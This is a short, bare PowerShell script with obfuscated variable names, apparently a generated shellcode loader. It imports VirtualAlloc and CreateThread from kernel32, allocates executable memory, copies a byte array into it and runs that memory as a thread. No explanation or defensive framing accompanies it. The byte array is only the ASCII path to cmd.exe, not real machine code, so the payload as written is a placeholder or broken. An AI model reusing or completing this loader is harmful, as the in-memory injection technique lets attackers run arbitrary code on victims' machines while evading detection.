$LRGjSvLkgypTL = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$EUvHenkqRSBhK = Add-Type -memberDefinition $LRGjSvLkgypTL -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $eYMkrEDXG = 0x63,0x3a,0x5c,0x77,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x73,0x79,0x73,0x74,0x65,0x6d,0x33,0x32,0x5c,0x63,0x6d,0x64,0x2e,0x65,0x78,0x65


$GIXcudyR = $EUvHenkqRSBhK::VirtualAlloc(0,[Math]::Max($eYMkrEDXG.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($eYMkrEDXG,0,$GIXcudyR,$eYMkrEDXG.Length)

$EUvHenkqRSBhK::CreateThread(0,0,$GIXcudyR,0,0,0)